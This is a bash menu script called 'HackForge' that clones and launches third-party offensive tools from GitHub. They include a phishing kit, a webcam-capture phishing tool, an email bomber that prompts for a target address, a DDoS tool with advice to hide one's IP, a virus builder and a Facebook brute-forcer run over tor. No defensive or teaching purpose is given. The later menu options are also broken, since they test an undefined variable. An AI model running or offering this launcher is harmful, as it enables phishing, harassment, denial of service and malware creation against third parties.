clear
mkdir Tools
clear 
echo -e '\033[31;40;1m
  ██   ██  █████╗  ██████╗ ██╗  ██╗███████╗ ██████╗  ██████╗  ██████╗ ███████╗
  ██   ██ ██╔══██╗██╔═══██╗██║  ██║██╔════╝██╔═══██╗██╔═══██╗██╔═══██╗██╔════╝
  ███████ ███████║██║   ██║███████║█████╗  ██║   ██║██║   ██║██║   ██║█████╗  
  ██╔══██ ██╔══██║██║   ██║██╔══██║██╔══╝  ██║   ██║██║   ██║██║   ██║██╔══╝  
  ██║  ██ ██║  ██║╚██████╔╝██║  ██║███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝ v4

  Project: HackForge
  Author: Rasagna
  github: https://github.com/Rasagna8412/HackForge
\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m Rasagna
'

echo -e "\e[37m[1]\e[36m Requirements & Update        \e[37m[2]\e[36m Phishing Tool              
\e[37m[3]\e[36m Webcam Hack                  \e[37m[4]\e[36m Subdomain Scanner          
\e[37m[5]\e[36m Gmail Bomber                 \e[37m[6]\e[36m DDOS Attack            
\e[37m[7]\e[36m How to use?                  \e[37m[8]\e[36m Uninstall downloaded programs      
\e[37m[9]\e[36m IP Info                      \e[37m[10]\e[36m Dorks-Eye
\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
\e[37m[15]\e[36m BadMod                       \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER "



# Option Selection
read -p "Enter option number: " choice

if [[ $choice == 1 || $choice == 01 ]]; then
  clear
  echo -e "\033[47;31;5m Installing updates and requirements...\033[0m"
  sleep 5
  pkg install git -y
  pkg install python python3 -y
  pkg install pip pip3 -y
  pkg install curl -y
  apt update
  apt upgrade -y
  clear
  echo -e "\033[47;3;35m Update complete...\033[0m"
  sleep 3
  bash all-tools.sh

elif [[ $choice == 2 || $choice == 02 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/htr-tech/zphisher
  cd zphisher
  bash zphisher.sh

elif [[ $choice == 3 || $choice == 03 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/techchipnet/CamPhish
  cd CamPhish
  bash camphish.sh

elif [[ $choice == 4 || $choice == 04 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  git clone https://github.com/zidansec/subscan
  cd subscan
  read -p "Enter a domain (example.com): " sc
  ./subscan $sc

elif [[ $choice == 5 || $choice == 05 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/juzeon/fast-mail-bomber.git
  cd fast-mail-bomber/
  mv config.example.php config.php
  php index.php update-providers
  rm -rf data/nodes.json data/dead_providers.json
  echo -e "\033[47;3;35m This installation may take a long time...\033[0m"
  echo -e "\033[47;3;35m Press Ctrl+C to stop\033[0m"
  sleep 4
  php index.php update-nodes
  php index.php refine-nodes
  echo "-------------------------"
  read -p "Enter an email address to bomb: " mail
  echo "-------------------------"
  php index.php start-bombing $mail

elif [[ $choice == 6 || $choice == 06 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/palahsu/DDoS-Ripper.git
  cd DDoS-Ripper
  python3 DRipper.py
  echo ""
  echo -e "\033[47;3;35m Hide your IP before using this tool\033[0m"

elif [[ $choice == 7 || $choice == 07 ]]; then
  clear
  echo "YouTube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
  python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
  sleep 10
  echo "Wait 10 seconds"
  bash all-tools.sh

elif [[ $choice == 8 || $choice == 08 ]]; then
  clear
  echo -e "\033[47;3;35m Removing downloaded programs...\033[0m"
  sleep 3 
  rm -rf Tools
  bash all-tools.sh

elif [[ $choice == 9 || $choice == 09 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  apt update
  apt install git curl
  git clone https://github.com/htr-tech/track-ip.git
  cd track-ip
  bash trackip

elif [[ $choice == 10 || $choice == 010 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/BullsEye0/dorks-eye.git
  cd dorks-eye
  pip install -r requirements.txt
  python3 dorks-eye.py

elif [[ $choice == 11 || $choice == 011 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  apt update && apt upgrade && apt install git && apt install python2
  git clone https://github.com/jaykali/hackerpro.git
  cd hackerpro
  sudo bash install.sh
  python2 hackerpro.py

elif [[ $choice == 12 || $choice == 012 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/Tuhinshubhra/RED_HAWK
  cd RED_HAWK
  php rhawk.php

elif [[ $choice == 13 || $choice == 013 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/Devil-Tigers/TigerVirus
  apt update
  apt upgrade -y
  pkg install git -y
  cd TigerVirus
  bash app.sh

elif [[ $choice == 14 || $choice == 014 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  pkg install curl -y
  apt upgrade -y
  pkg install git -y
  git clone https://github.com/king-hacking/info-site.git
  cd info-site
  bash info.sh

elif [[ $islem == 15 || $islem == 015 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  sudo apt-get update
  sudo apt-get install php
  sudo apt-get install php-curl
  git clone https://github.com/MrSqar-Ye/BadMod.git
  cd BadMod
  chmod u+x INSTALL
  chmod u+x BadMod.php
  sudo php BadMod.php

elif [[ $islem == 16 || $islem == 016 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  git clone https://github.com/fu8uk1/facebash
  cd facebash
  bash install.sh
  chmod +x facebash.sh
  tor
  sudo ./facebash.sh

elif [[ $islem == 17 || $islem == 017 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  sleep 3
  cd Tools
  pkg install git
  pkg install python2
  apt install git
  apt install python2
  git clone https://github.com/D4RK-4RMY/DARKARMY
  cd DARKARMY
  chmod +x darkarmy.py
  python2 darkarmy.py

elif [[ $islem == 18 || $islem == 018 ]]; then
  clear
  echo -e "\033[47;3;35m Installation may take some time...\033[0m"
  echo -e "\033[47;3;35m This tool will require you to be ROOT\033[0m"
  sleep 3
  cd Tools
  sudo apt-get install tor
  pip3 install requests
  git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
  cd Auto_Tor_IP_changer
  echo -e "\033[47;3;35m Go to your browser / change the proxy settings (sock proxy) to 127.0.0.1:9050\033[0m"
  sleep 8
  python3 install.py
  aut

else   
  clear
  echo -e '\033[36;40;1m You entered an incorrect code' 
  sleep 1
  clear 
  bash alhack.sh
fi
